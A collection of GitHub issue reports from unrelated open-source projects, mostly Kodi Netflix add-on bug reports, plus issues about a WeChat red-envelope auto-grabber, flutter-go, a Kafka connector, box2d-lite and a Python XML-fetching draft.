不知道各位有什么其他好想法没。  只能在当前聊天群窗口才能抢红包，在桌面或者其他软件，或者其他聊天群，即使通知栏有红包消息也不会点进去，请修复谢谢大佬 最新版的微信貌似不用不了了。啥时候更新一波呢，嘿嘿 我是小米手机MIUI10.3.6  微信版本是7.0.3。 遇见两个问题。 开启opencv功能后。 在群聊天界面聊天时，看到的红包会打开，但是不拆包直接返回到聊天列表界面，然后再进入群，再将红包打开。第2个问题，开启opencv功能后，不能进入应用分身，一旦进入应用分身，界面就卡死了，点击什么都不能用。除非一直按电源键关机重启，不然没有其他办法。 设置界面全部勾选,打开辅助功能,发红包
在android 7.1的设备,能去到红包领取界面
在android 8.0的设备,完全没反应
(更新一下,android 8 是要一直开着聊天的那个群的界面才可以,按home键全部退到后台之后,无法从通知栏获取[**红包]关键字进入聊天界面) 只能在当前聊天群窗口才能抢红包，在桌面或者其他软件，或者其他聊天群，即使通知栏有红包消息也不会点进去，请修复谢谢大佬
<---------->
163877990
- https://zerotier.com
- https://zero.pritunl.com/
- https://github.com/pomerium/pomerium (:D)
- https://github.com/cogolabs/transcend
- more? - https://zerotier.com
- https://zero.pritunl.com/
- https://github.com/pomerium/pomerium (:D)
- https://github.com/cogolabs/transcend
- more?
<---------->
163903199
Hi Erin. Thanks for sharing your great articles for physics.
I'm studying game physics based on your articles

I found one repeated line on Arbiter.cpp

This is first calculation on 137
https://github.com/erincatto/box2d-lite/blob/d9705826ca1589a1dc9d3c45396f4678f30e70a9/src/Arbiter.cpp#L137

However, it is repeated on 166
https://github.com/erincatto/box2d-lite/blob/d9705826ca1589a1dc9d3c45396f4678f30e70a9/src/Arbiter.cpp#L166 Hi Erin. Thank you for sharing your great articles for physics.
I'm studying game physics based on your articles

I found one repeated line on Arbiter.cpp

This is first calculation on 137
https://github.com/erincatto/box2d-lite/blob/d9705826ca1589a1dc9d3c45396f4678f30e70a9/src/Arbiter.cpp#L137

However, it is repeated on 166
https://github.com/erincatto/box2d-lite/blob/d9705826ca1589a1dc9d3c45396f4678f30e70a9/src/Arbiter.cpp#L166
<---------->
164159157
https://github.com/whoisryosuke/pure-components/blob/03dde67a00564d0b50db0c2ec5a066b924450a72/src/components/Button/Button.js#L67

why is outline set to `0` on focus? that makes button not accessible by default
<---------->
164220347
Criar uma categoria para apenas SQL:
MySQL, Oracle SQL, MSSQL, e etc. Vou dar andamento nesse tutorial pessoal! Seria legal ter um tutorial para esta instalação? Se vocês acharem util posso fazer :D Tutorial de instalação do VSCodium no Ubuntu e Debian Chocolatey é um gerenciador de pacotes para o windows, é extremamente útil pra instalar vários tipos de programas (até o Visual Studio tem lá) Seria legal ter um tutorial para esta instalação? Se vocês acharem util posso fazer :D      Tutorial de como instalar pyenv (gerenciador de múltiplas versões Python) no Ubuntu. Faz sentido para o propósito do repo? Se fizer, me disponho a criar o conteúdo.   Eu farei este tutorial   Já tem um tutorial que engloba todas distribuições, utilizando o RVM, mas como utilizo o Arch Linux a um tempo e gosto mais de gerenciar as instalações utilizando o seu próprio gerenciador de pacotes, vou adicionar esta maneira, já que é também a forma que a Wiki recomenda. Olá a todos! Venho em paz.

Acho a iniciativa super bacana e acredito que podemos expandir a divulgação desse conteúdo.

Possuo um [site](https://exata0mente.com.br/) construído com Jerkyll e hospedado no Github (utilizando o serviço do github pages) ao qual postamos resoluções de exercícios que aparecem em livros que vemos no decorrer da vida acadêmica. **este site é totalmente colaborativo** e aberto para qualquer pessoa realizar postagens, alterações, e etc. 

Referente aos exercícios, o carro chefe do site, são de teor mais técnicos e geralmente voltados à computação, sempre aparece algum programa para instalar ou sugestão de programas. Penso que podemos trabalhar das seguintes formas:


## Postagem de _como-instalar-xy_
Seria basicamente os tutoriais aqui inseridos porém publicado no site. [Postar](https://github.com/exata0mente/exata0mente.github.io/blob/master/docs/CONTRIBUTING.md) no site é muito simples e pode ser inclusive utilizando o markdown.

O site está bem elementar mas a ideia é criar uma série de postagens *como-instalar-xyz* para divulgar o trabalho. 

As postagens podem ser diretamente relacionadas a conteúdos que já existem no próprio site, como será citado abaixo.

Por exemplo: Temos resposta de exercícios do livro [Treinamento em Linguagem C](https://exata0mente.com.br/indice/livro/treinamento_em_linguagem_c) da Victorine Mizrahi. Obviamente este livro usa extensivamente a linguagem C. Podemos então ter postagens sobre como instalar IDEs, Editores de Textos e até Compiladores.

Conseguiremos então divulgar a comunidade backend-br, exata0mente e também pode servir de portifólio para quem tenha interesse em realizar postagens.

## Tecnologias de contribuição

Conforme dito, o site é colaborativo e disponível para qualquer pessoa realizar postagens, alterações, sugestões e até praticar CSS (por exemplo). Para que isso seja possível utilizamos o gerador de sites estáticos Jerkyll.

A sua instalação não é tão elementar, ainda mais pelo fato de que é necessário possuir o Ruby instalado.

Então (já fica como sugestão), criar um tutorial de como instalar estes programas. Se possível criar até uma postagem como dito anteriormente pois acredito que atenderá não só ao site mas a pessoas de fora do site também. O(s) conteúdo(s) será referenciado no meu [README.md](https://github.com/exata0mente/exata0mente.github.io#criando-um-parquinho)

Bom, acho que é isso, caso queiram mais detalhamentos fico à disposição.

Fique a vontade também para encerrar esta issue caso não tenha relação com o tema do repositório.

Forte abraço! 
https://github.com/exata0mente/ Estou interessado em criar um tutorial de instalação de Java OpenJDK sistema linux, distribuição debian.
<---------->
164314803
Hi,
I have shield experience 8.0.1
ish 0.4.3
Netflix plugin 0.15.3
But ish don't find widevine, have you an idea?
Thanks [Hello,](url
[kodi.log](https://github.com/CastagnaIT/plugin.video.netflix/files/3642964/kodi.log)
)

I am running retropie 4.5.1. with Kodi 18.2
I installed the netflix addon 0.13.23 , whenever I start it I get the message: netflix error
When I go to settings I can browse all settings, I can not choose logout, then I get the same error. It I never get the popup for the login screen. I have already removed the addon and reinstalled it, with the same effect. I am not sure how I extract the logfile for this addon, I hope attached kodi.log is all that is needed.? <MPD mediaPresentationDuration="PT3428.0.00S" xmlns="urn:mpeg:dash:schema:mpd:2011" xmlns:widevine="JUSTWRITEANYTHING" xmlns:cenc="urn:mpeg:cenc:2013">

This is to get rid of the error in browsers so that the xml can be properly read when debugging for moments like debugging. 

Change converter.py

def _mpd_manifest_root(duration):
    root = ET.Element('MPD')
    root.attrib['xmlns'] = 'urn:mpeg:dash:schema:mpd:2011'
    root.attrib['xmlns:cenc'] = 'urn:mpeg:cenc:2013'
    root.attrib['xmlns:widevine'] = 'Whazupheretogetridofnamespaceproblems'
    root.attrib['mediaPresentationDuration'] = duration
    return root

Or just skip using namespace solutions when showing the license

I don't understand the need for this to be written like this otherwise? It's shown just once anyway

<widevine:license robustness_level="HW_SECURE_CODECS_REQUIRED"/>
like this
<license robustness_level="HW_SECURE_CODECS_REQUIRED"/>
or
<widevine robustness_level="HW_SECURE_CODECS_REQUIRED"/> ## Feature request
I'm submitting a proposal to ...
  - [ ] new feature
  - [X] change an existing feature

### Describe your request
I'd like to submit 2 enhancements to the profile management.
At logout, profiles, profiles config, and all related data with the profiles are not deleted fr om the database => We could ask if the user wants to delete them and perform the cleanup.

At login, if I read the code well, every profiles not related to the current user are deleted, with the related data. We shouldn't if the user wants to keep them.

#### Describe an alternative
A warning in the readme about loosing data when connecting with an another profile, i.e. for some test. And encourage people to save their data before performing such operation.

#### Development tips
A bit tricky, as we may need to associate every profile with an account. And maybe it's not a good idea... Discussion opened. *I'm submitting a ...*
  - [x] bug report
  - [ ] feature request
  - [ ] support request

## General information

### Addon version used

v0.14.5

### Description

"My list" is limited to 92 entries, everything beyond that number is send into a sub-folder called "next page". The main issue with that, the movies and the series inside the "next page" are not sync with the library (even if you force the synchronization).

### Steps to Reproduce

1. Add more than 92 movies/films
2. See if there is a "next page" sub-folder in "My List"

**Expected behavior:** [What you expected to happen]
No sub-folder "next page" and a complete synchronization of "My list"

**Actual behavior:** [What actually happened]
Sub-folder "Next page" created inside "My list" with movies/series inside and this folder is not synchronized with the library.

## Context (Environment)

### Installation

* [x] I'm using this Netflix Repo
* [ ] I'm using other Netflix Repo (Please specify which)
* [ ] I'm using a different source (Please tell which)

### Operating System

* [ ] Linux (x86/x64)
* [ ] OSX (x86/x64)
* [ ] Windows (x86/x64)
* [x] Linux (ARM)
* [ ] Android

#### Additional informatin on the environment

env: OSMC ## Help request

#### Your Environment
- Netflix add-on version: v0.16.0
- Operating system version/name: Android 9
- Device model: Nvidia Shield

Used Operating system:
* [X] Android
* [ ] iOS
* [ ] Linux
* [ ] OSX
* [ ] Raspberry-Pi
* [ ] Windows

I cannot get Dolby Atmos on my Shield. Tried everything. There are only DD+ on stream selects and AV says that it is dolby digital+. Am I missing something?
 ## Bug report

#### Your Environment
- Netflix add-on version: 0.16.1
- Operating system version/name: Windows 10 1803
- Kodi version: 18.2

Used Operating system:
* [ ] Android
* [ ] iOS
* [ ] Linux
* [ ] OSX
* [ ] Raspberry-Pi
* [ X ] Windows

### Describe the bug

#### Expected behavior
Extension should login properly and display the menu.

#### Actual behavior
After entering login information, extension displays "Login Success" notification and then hangs on infinite loading spinner.

#### Steps to reproduce the behavior
1. Install extension from scratch
2. Open extension
3. Enter your email and password

### Debug log
The debug log can be found from this link: [logs.txt](https://github.com/CastagnaIT/plugin.video.netflix/files/4010950/logs.txt)

This appears to be the cause, from logs:

`ERROR: [plugin.video.netflix (0)] Could not extract [u'models', u'playerModel', u'data', u'config', u'ui', u'initParams', u'apiUrl']`

#### Installation
From CastagnaIT repo

 Hello,

Netflix made full hungarian localization a few days ago. After that I set language to hungarian. Now in the addon the menus (My list, Continue watching etc.) are in hungarian language, but when I click on them, I get an error message.

Could you please fix this problem? *I'm submitting a ...*
  - [X] bug report
  - [ ] feature request
  - [ ] support request

## General information

Randomly, on two 24/7 running RPis, I have this error:

` MSLError: Message expired and not renewable or missing key request data. Rejected. `

The only way to get rid of it is to restart the addon or the system. Then everything works again as expected.

For now, I have no idea of the root cause.

### Addon version used

0.14.5 / 0.14.6 + export episodes features

## Debug log
Sorry logs are not in debug as it's my main install and it's pretty hard to determine when it will pop-up. It's cut to the revelent error, nothing interesting before or after.

https://paste.kodi.tv/ragabefiqo.kodi
 # __For other users__
The solution (for me, until a fix) was:
- removing all extension and data from 0.15.4
- installing 0.15.3 from Zip
- Log in
- update extension

## Help request

#### Your Environment
- Netflix add-on version: 0.15.4
- Operating system version/name: OSMC 18.3 stable
- Device model:  Rpi 3

Used Operating system:
* [ ] Android
* [ ] iOS
* [X] Linux
* [ ] OSX
* [X] Raspberry-Pi
* [ ] Windows

### Describe your help request
<!--- A bug report that is not clear will be closed -->
<!--- WHEN APPROPRIATE (MOST OF THE CASES) ALWAYS ATTACH THE LINK FOR KODI LOG FILE, SEE BELOW -->
<!--- Put your text below this line -->
Impossible to login, `Profile missing` raised error
[kodi.log](https://github.com/CastagnaIT/plugin.video.netflix/files/3719771/kodi.log)
<!--- Add some screenshots if that helps understanding your problem -->


<!---
This addon respects the same rules used in the Kodi forum
https://kodi.wiki/view/Official:Forum_rules
therefore the single violation will eliminate your request
-->
 ## Bug report

#### Your Environment
- Netflix add-on version: 0.15.3
- Operating system version/name: Android TV 8.0 Oreo
- Device model:  Sony BRAVIA KD-65XF9005

Used Operating system:
* [x] Android

### Describe the bug
I use the [Backup add-on](https://kodi.wiki/view/Add-on:Backup) to take Kodi config snapshots (including add-on settings) which I restore in case of problems. I now stumbled over a problem, causing Kodi to crash on startup after restoring from backup. The stack trace points to DRM. So I deleted msl_data and COOKIE files which solved the crash.

I logged into Netflix, took another backup and restored from that backup which did not result in a crash. So I assume that the crash is due to outdated msl_data and/or COOKIE files.

I wonder whether this also happens if Kodi has not been run for several days, also leaving you with old msl_data/COOKIE files.

#### Expected behavior
Kodi does not crash on startup.

#### Actual behavior
Kodi crashes on startup.

#### Steps to reproduce the behavior
1. Take backup via Backup add-on (don't forget to also enable add-on settings to be included)
2. Wait some time (days?)
3. Restore from backup
4. Restart Kodi

You can probably also save today's msl_data and COOKIE file and copy/replace them later on.

### Debug log
The debug log can be found here: [[logcat](https://www.dropbox.com/s/6xk0qx3mpr6j708/kodi_netflix_crash.log?dl=0)]

Debug logging has not been enabled inside Kodi. I could however alter the backup somehow to enable it in case it is required. The log however includes the stack trace of the crash. ## Bug report

#### Your Environment
- Netflix add-on version: 0.15.3
- Operating system version/name: Android TV 8.0 Oreo
- Device model:  Sony BRAVIA KD-65XF9005

Used Operating system:
* [x] Android

### Describe the bug
I use the [Backup add-on](https://kodi.wiki/view/Add-on:Backup) to take Kodi config snapshots (including add-on settings) which I restore in case of problems. I now stumbled over a problem, causing Kodi to crash on startup after restoring from backup. The stack trace points to DRM. So I deleted msl_data and COOKIE files which solved the crash.

I logged into Netflix, took another backup and restored from that backup which did not result in a crash. So I assume that the crash is due to outdated msl_data and/or COOKIE files.

I wonder whether this also happens if Kodi has not been run for several days, also leaving you with old msl_data/COOKIE files.

#### Expected behavior
Kodi does not crash on startup.

#### Actual behavior
Kodi crashes on startup.

#### Steps to reproduce the behavior
1. Take backup via Backup add-on (don't forget to also enable add-on settings to be included)
2. Wait some time (days?)
3. Restore from backup
4. Restart Kodi

You can probably also save today's msl_data and COOKIE file and copy/replace them later on.

### Debug log
The debug log can be found here: [[logcat](https://www.dropbox.com/s/6xk0qx3mpr6j708/kodi_netflix_crash.log?dl=0)]

Debug logging has not been enabled inside Kodi. I could however alter the backup somehow to enable it in case it is required. The log however includes the stack trace of the crash. ## Bug report

#### Your Environment
- Netflix add-on version: 0.15.3
- Operating system version/name: LibreElec 9.0.2
- Device model:  WeTek Core

Used Operating system:
* [ ] Android
* [ ] iOS
* [x] Linux
* [ ] OSX
* [ ] Raspberry-Pi
* [ ] Windows

### Describe the bug
Different languages are offered between the Netflix web UI, and the addon. See for example
“Super Monsters”, Season 3, “05. Green with Envy / Oops, We shrunk the Cars”.

In Kodi, the available audio streams are (ignoring 2/6 channels duplicates)
Greek, English, Italian, Vietnamese, Chinese

In the Netflix Web UI there are (ignoring audio description duplicates)
English, French, Italian, Vietnamese, Mandarin

I'm after French, which is definitely available in the Web UI, and I have confirmed that Greek is not a mis-labelled French (it is definitely Greek to me!).

#### Expected behavior
All available audio streams should be displayed, i.e., including French.

#### Actual behavior
French is not available. Oddly enough, Greek is, which the Web UI didn't have, but that's OK.

#### Steps to reproduce the behavior
Check the audio streams for “Super Monsters”, Season 3, “05. Green with Envy / Oops, We shrunk the Cars”.

### Debug log
The debug log can be found here: 
https://gist.github.com/shtrom/a40f90ac3f60bcb1ce13650c5825ddee

#### Installation
* [ ] I'm using other Netflix Repo [using CastagnaIT Repository]
* [ ] I'm using a different source <!--- Specify which one is used --> ## Bug report

#### Your Environment
- Netflix add-on version: 15.2
- Operating system version/name: Android TV 8.0 Oreo
- Device model:  Sony BRAVIA KD-65XF9005

Used Operating system:
* [X] Android

### Describe the bug
I use the [Backup add-on](https://kodi.wiki/view/Add-on:Backup) to take Kodi config snapshots (including add-on settings) which I restore in case of problems. I now stumbled over a problem, causing Kodi to crash on startup after restoring from backup. The stack trace points to DRM. So I deleted msl_data and COOKIE files which solved the crash.

I logged into Netflix, took another backup and restored from that backup which did not result in a crash. So I assume that the crash is due to outdated msl_data and/or COOKIE files.

I wonder whether this also happens if Kodi is not run for several days, also leaving you with old msl_data/COOKIE files. But I might very well be wrong about all that...

#### Expected behavior
Kodi does not crash on startup.

#### Actual behavior
Kodi crashes on startup.

#### Steps to reproduce the behavior
1. Take backup via Backup add-on (don't forget to also enable add-on settings to be included)
2. Wait some time (days?)
3. Restore from backup
4. Restart Kodi

### Debug log
The debug log can be found here: [[logcat](https://www.dropbox.com/s/6xk0qx3mpr6j708/kodi_netflix_crash.log?dl=0)]

Debug logging has not been enabled inside Kodi. I could however alter the backup somehow to enable it in case it is required. The log however includes the stack trace of the crash. ## Bug report

#### Your Environment
- Netflix add-on version: 0.15.7 (issue since 0.15.6)
- Operating system version/name: LibreElec 9.1.501 (9.2 beta)
- Device model:  Raspberry Pi 3b+
Used Operating system:

* [ ] Raspberry-Pi / LibreElec

### Describe the bug
The audio is heavily out of sync. 2-3 Seconds. Setting the resolution to lower (576p) or disabling DD+ or other fancy audio codecs didn't help.
<!--- Put your text below this line -->

#### Expected behavior
Audio should be in sync.
#### Actual behavior
Audio is not in sync.

#### Steps to reproduce the behavior
<!--- Put your text below this line -->
1. Play any video
2. Wait 30 seconds before audio is out of sync
3. Pause video, it continues playing without sound
4. Start again, will be out of sync after that duration.

#### Possible fix
I don't know what could cause the issue.
<!--- Put your text below this line -->

### Debug log
The debug log can be found on my own server. I enabled Enhanced debugging due to the video related issues.
Check out the following 25k lines:
https://server.giessmann.net/pad/p/r.073fa3bd5f14adcf6e1a464e355377e6

### Additional context or screenshots (if appropriate)

#### Installation
Using the CastagnaIT repository.

#### Other information
<!--- E.g. related issues, suggestions, links for us to have context, etc... -->
<!--- Put your text below this line -->

#### Screenshots
<!--- Add some screenshots if that helps understanding your problem -->


<!---
This addon respects the same rules used in the Kodi forum
https://kodi.wiki/view/Official:Forum_rules
therefore the single violation will eliminate your request
-->
 ## Bug report

#### Your Environment
- Netflix add-on version: <!--- e.g. 14.1 --> 15.5
- Operating system version/name: <!--- e.g. Windows 10, LibreElec 9.0, etc... --> Manjaro Linux latest, kodi latest stable 18.4
- Device model:  <!--- if appropriate -->

Used Operating system:
* [ ] Android
* [ ] iOS
* [X ] Linux
* [ ] OSX
* [ ] Raspberry-Pi
* [ ] Windows

### Describe the bug
Just installed the addon on my new new media center with Manjaro Linux and kodi 18.4 and every video i try to reproduce gives the error KeyError: u'licenseResponseBase64'

#### Expected behavior
<!--- Tell us what should happen -->
<!--- Put your text below this line -->
Video reproduction starting

#### Actual behavior
<!--- Tell us what happens instead -->
<!--- Put your text below this line -->
KeyError: u'licenseResponseBase64' given

#### Steps to reproduce the behavior
<!--- Put your text below this line -->
1. Open the addon
2. Start any video

#### Possible fix
<!--- Not obligatory, but suggest a fix or reason for the bug -->
<!--- Put your text below this line -->

### Debug log
<!--- How to get the log? Read Kodi wiki: https://kodi.wiki/view/Log_file/Easy
RESPECT THE RULES!
- A DEBUG LOG IS ALWAYS MANDATORY WHEN CREATING AN ISSUE. PROVIDE ONE!
- Do NOT PASTE THE CONTENT of the log HERE
- Do NOT CUT the log
- If the log file is really huge (more 1Mb) in Kodi settings disable "Component-specific logging" then create a new log
-->
The debug log can be found here: 
http://dlsys.r1-it.storage.cloud.it/kodi.log


### Additional context or screenshots (if appropriate)

#### Installation
* [ ] I'm using other Netflix Repo <!--- Specify which one is used -->
* [ ] I'm using a different source <!--- Specify which one is used -->

#### Other information
<!--- E.g. related issues, suggestions, links for us to have context, etc... -->
<!--- Put your text below this line -->

#### Screenshots
<!--- Add some screenshots if that helps understanding your problem -->


<!---
This addon respects the same rules used in the Kodi forum
https://kodi.wiki/view/Official:Forum_rules
therefore the single violation will eliminate your request
-->
 ## Bug report

#### Your Environment
- Netflix add-on version: <!--- e.g. 14.1 --> 15.5
- Operating system version/name: <!--- e.g. Windows 10, LibreElec 9.0, etc... --> Manjaro Linux latest, kodi latest stable 18.4
- Device model:  <!--- if appropriate -->

Used Operating system:
* [ ] Android
* [ ] iOS
* [x] Linux
* [ ] OSX
* [ ] Raspberry-Pi
* [ ] Windows

### Describe the bug
Just installed the addon on my new new media center with Manjaro Linux and kodi 18.4 and every video i try to reproduce gives the error KeyError: u'licenseResponseBase64'

#### Expected behavior
<!--- Tell us what should happen -->
<!--- Put your text below this line -->
Video reproduction starting

#### Actual behavior
<!--- Tell us what happens instead -->
<!--- Put your text below this line -->
KeyError: u'licenseResponseBase64' given

#### Steps to reproduce the behavior
<!--- Put your text below this line -->
1. Open the addon
2. Start any video

#### Possible fix
<!--- Not obligatory, but suggest a fix or reason for the bug -->
<!--- Put your text below this line -->

### Debug log
<!--- How to get the log? Read Kodi wiki: https://kodi.wiki/view/Log_file/Easy
RESPECT THE RULES!
- A DEBUG LOG IS ALWAYS MANDATORY WHEN CREATING AN ISSUE. PROVIDE ONE!
- Do NOT PASTE THE CONTENT of the log HERE
- Do NOT CUT the log
- If the log file is really huge (more 1Mb) in Kodi settings disable "Component-specific logging" then create a new log
-->
The debug log can be found here: 
http://dlsys.r1-it.storage.cloud.it/kodi.log


### Additional context or screenshots (if appropriate)

#### Installation
* [ ] I'm using other Netflix Repo <!--- Specify which one is used -->
* [ ] I'm using a different source <!--- Specify which one is used -->

#### Other information
<!--- E.g. related issues, suggestions, links for us to have context, etc... -->
<!--- Put your text below this line -->

#### Screenshots
<!--- Add some screenshots if that helps understanding your problem -->


<!---
This addon respects the same rules used in the Kodi forum
https://kodi.wiki/view/Official:Forum_rules
therefore the single violation will eliminate your request
-->
 ## Bug report

#### Your Environment
- Netflix add-on version: v 0.16.0
- Operating system version/name: android pie
- Device model:  shield TV(2017)

Used Operating system:
* [o ] Android
* [ ] iOS
* [ ] Linux
* [ ] OSX
* [ ] Raspberry-Pi
* [ ] Windows

### Describe the bug
i use this plugin, thank you

but i recognized some problem

in input adaptive settings for 4k contents, i can not use subtitles 

![image](https://user-images.githubusercontent.com/44728502/70241443-64bdcf80-17b2-11ea-8d26-9d4563a64342.png)

![image](https://user-images.githubusercontent.com/44728502/70241459-6b4c4700-17b2-11ea-9406-bbf794a94d28.png)


![image](https://user-images.githubusercontent.com/44728502/70241395-4eb00f00-17b2-11ea-85a5-d9aeb8233388.png)

in input adaptive settings for hd contents, everything's ok

![image](https://user-images.githubusercontent.com/44728502/70241612-ababc500-17b2-11ea-8a5a-37a5f0c4a86a.png)

![image](https://user-images.githubusercontent.com/44728502/70241626-b36b6980-17b2-11ea-99a7-0c8be26e98ba.png)
 ## Bug report

#### Your Environment
- Netflix add-on version: v 0.16.0
- Operating system version/name: android pie
- Device model:  shield TV(2017)

Used Operating system:
* [o ] Android
* [ ] iOS
* [ ] Linux
* [ ] OSX
* [ ] Raspberry-Pi
* [ ] Windows

### Describe the bug
i use this plugin, thank you

but i recognized some problem

in input adaptive settings for 4k contents, i can not use subtitles 

![image](https://user-images.githubusercontent.com/44728502/70241443-64bdcf80-17b2-11ea-8d26-9d4563a64342.png)

![image](https://user-images.githubusercontent.com/44728502/70241459-6b4c4700-17b2-11ea-9406-bbf794a94d28.png)


![image](https://user-images.githubusercontent.com/44728502/70241395-4eb00f00-17b2-11ea-85a5-d9aeb8233388.png)

in input adaptive settings for hd contents, everything's ok

![image](https://user-images.githubusercontent.com/44728502/70241612-ababc500-17b2-11ea-8a5a-37a5f0c4a86a.png)

![image](https://user-images.githubusercontent.com/44728502/70241626-b36b6980-17b2-11ea-99a7-0c8be26e98ba.png)
 ## Bug report

#### Your Environment
- Netflix add-on version: 0.15.5
- Operating system version/name: Android 8
- Device model:  Mibox

Used Operating system:
* [x] Android
* [ ] iOS
* [ ] Linux
* [ ] OSX
* [ ] Raspberry-Pi
* [ ] Windows

### Describe the bug
First of all thank you very much for this addon.
I'm only able to get to 4k if set the stream to manual on inputstream adaptive addon, i tried to set Min Bandwidth to over 16,000,000 (I guess it should be enough to get 4k, if not how much???), but if i do that I'm not able to select any subtitle

#### Expected behavior
On subtitle setings it should be able to choose among subtitles languages

#### Actual behavior
It doesn't show any subtitle avaliable

#### Steps to reproduce the behavior
1. Enable all setings to be able to run in 4k
2. Set inputstream adaptive addon stream selection to manual
3. Try to choose a subtile

#### Possible fix
Downloading a subtitle from another source/addon, not really a fix but a workaround

Thanks again
<---------->
164465386
The current version 0.9.4 has a configuration definition where the secret API server is a String, this should be transformed to PASSWORD

Ensure that the change is forward compatible with a configuration schema with a string password or create the relevant release notes. I have downloaded the code and executed `mvn clean install` on it. One test is failing. 

```
EventLogSourceTaskTest.as_a_client_I_want_a_token_to_only_generate_once_while_before_token_expiry:148 expected: <145750cc-e2a7-49a8-baca-5e16dff885bd> but was: <e3433a24-cf4a-47e9-8874-164a040c465e>
```
Check it out whenever you can. Thanks for sharing your project. It is helping getting to understand how a kafka connector is created. Current connector requires a version of the runtime that limits the deployment community, there are not fundamental features of the recent version on this connector.

Consider restoring the 1.0 API version for the connect-api 
<---------->
164608222
在ios真机里体验，那简直是噩梦。。建议去掉这种卡的过渡，或者做成异步渲染的，这每跳个页面都要卡一下
 在ios真机里体验，那简直是噩梦。。建议去掉这种卡的过渡，或者做成异步渲染的，这每跳个页面都要卡一下
 2019.2.19  * 建议升级支持AndroidX,每次pull都手动修改.
下面是修改的内容:


  image_picker: ^0.6.0+9
ext.kotlin_version = '1.3.0'
classpath 'com.android.tools.build:gradle:3.3.0'

android.enableJetifier=true
android.useAndroidX=true

compileSdkVersion 28
testInstrumentationRunner "android.test.runner.AndroidJUnitRunner"
androidTestImplementation 'com.android.support.test:runner:1.1.1'
androidTestImplementation 'com.android.support.test.espresso:espresso-core:3.1.1'


 下载后配置了dart sdk目录和futter目录、依赖包下载后，项目编译通过，但是不管是接上模拟器还是真机都跑步起来，
![image](https://user-images.githubusercontent.com/30900888/52680220-aa36b500-2f72-11e9-85f1-200fc9798f84.png)
![image](https://user-images.githubusercontent.com/30900888/52680232-b3c01d00-2f72-11e9-8e3e-1b00d517f193.png)
编译时候出现以下信息后就停了，message和event log都没有啥信息，想问问是怎么回事？谢谢
![image](https://user-images.githubusercontent.com/30900888/52680241-be7ab200-2f72-11e9-9f42-5f357a913c37.png)
![image](https://user-images.githubusercontent.com/30900888/52680265-d05c5500-2f72-11e9-9d74-d4e17574ea18.png)

 实例demo的apk，animatedlist  点击减号，item并没有减掉  加号功能没有问题 readme 首页 Powered by 阿里拍卖前端团队 点进去 404
https://github.com/alibaba/flutter-go/blob/master/README.md Windows环境下，androidStudio在真机上运行出现异常。
荣耀5X，6.0.1。
 搞个视频播放器，拥有腾讯视频播放一样功能。 ![](https://ws1.sinaimg.cn/large/006tNc79ly1g02zwrn99vj30u01hcgnq.jpg) ![](https://ws1.sinaimg.cn/large/006tNc79ly1g02zwrn99vj30u01hcgnq.jpg) ## Bug Report

**仅限中文与英文**, 其他语言的提交将直接被关闭

请先确认查找了已有的 issue [GitHub issues](https://github.com/apache/incubator-shardingsphere-example/issues).

为了更好的收录您反馈或者提交的相关pr. 请您关注您提交的问题, 我们可能需要更多的详细信息, 我们会在issue下先您收集相关信息,
如果长时间未得到您的回复, 如果我们无法在某些环境上重现该问题, 并且您**超过7天未回复**, 我们可能会关 **闭掉issue**, 谢谢


### 游客进入APP-> 点击WIDGET-> 点击DomeName->点击标题栏的小房子

### 正常进入主页

### 崩溃黑屏

 ### flutter doctor信息
Doctor summary (to see all details, run flutter doctor -v):
[√] Flutter (Channel stable, v1.9.1+hotfix.4, on Microsoft Windows [Version 10.0.18362.418], locale zh-CN)

[√] Android toolchain - develop for Android devices (Android SDK version 28.0.3)
[√] Android Studio (version 3.5)
[!] IntelliJ IDEA Ultimate Edition (version 2018.1)
    X Flutter plugin not installed; this adds Flutter specific functionality.
    X Dart plugin not installed; this adds Dart specific functionality.
[√] Connected device (1 available)

! Doctor found issues in 1 category.

### 预期的表现
密码框正常输入
### 实际的表现
在Android下，login页面中的密码框在用九宫格键盘输入时出现输入不了的情况。

### 以下是我的代码
import 'package:flutter/material.dart';

void main() => runApp(AppScene());

class AppScene extends StatelessWidget {

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      home: Scaffold(
        appBar: AppBar(
          title: Text('title'),
        ),
        body: Center(
          child: TextField(
            obscureText: true,
          ),
        ),
      ),
    );
  }

}
 No description provided. Hello

 Sssss

 
/bin/sh: /packages/flutter_tools/bin/xcode_backend.sh: No such file or directory ![image](https://user-images.githubusercontent.com/14145407/53080392-8d325100-3533-11e9-8e5a-deab975d1aba.png)
如图所示,还是建议有时间重新整理下所有文件夹,以保证符合规范 Failed to find assets path for "Frameworks/App.framework/flutter_assets"
registrationID获取失败，code：1011
![屏幕快照 2019-07-31 上午8 48 53](https://user-images.githubusercontent.com/44365441/62175494-8b857880-b370-11e9-86dd-9c7c59505889.png)
![屏幕快照 2019-07-31 上午8 50 38](https://user-images.githubusercontent.com/44365441/62175503-90e2c300-b370-11e9-8c89-c677a52a4bb6.png)
![屏幕快照 2019-07-31 上午8 44 51](https://user-images.githubusercontent.com/44365441/62175508-93ddb380-b370-11e9-887c-df93d884102f.png)



<---------->
164741812
@cuducos, eu notei que estava reescrevendo muitas linhas para trabalhar os arquivos obtidos no formato `zip`, além de ter repetição nas duas classes que trabalham com `xml` (uma para arquivos locais e outra para arquivos remotos).

Refiz, portanto, o util `fetch.py` quase todo. Não testei ainda, pois o site da Alesp há dias está fora do ar.

Queria suas considerações. Será que funciona?

```python
import os
import re
from datetime import datetime
import xml.etree.ElementTree as ElementTree
from urllib.request import urlretrieve
from zipfile import ZipFile

import pandas as pd


class Parse_xml:

    hoje = datetime.strftime(datetime.now(), '%Y-%m-%d')
    DATA_DIR = f'data_{hoje}'

    def __init__(self, xml_data):
        self.tree = ElementTree.parse(xml_data)
        self.root = self.tree.getroot()

    def parse_root(self, root=None):
        root = root if root else self.root
        yield from (self.parse_element(child) for child in iter(root))

    def parse_element(self, element, parsed=None):
        if parsed is None:
            parsed = dict()

        new_values = {k: element.attrib.get(k) for k in element.keys()}
        parsed.update(new_values)
        if element.text:
            parsed[element.tag] = element.text

        for child in list(element):
            self.parse_element(child, parsed)

        return parsed

    def process_data(self):
        return pd.DataFrame(self.parse_root())


class Parse_xml_external(Parse_xml):

    def __init__(self, xml_data):
        super().__init__(xml_data)
        self.root = ElementTree.XML(xml_data)


class Retrieve_zip(Parse_xml):

    def __init__(self, url, xml_data):
        super().__init__(xml_data)
        self.url = url

    def unzip(self):
        url_pattern = re.compile(r'http|s:.*\w*\.zip$')
        zip_name = re.sub(url_pattern, r'\w*\.zip$', self.url)
        urlretrieve(self.url, f'{self.DATA_DIR}/{zip_name}')
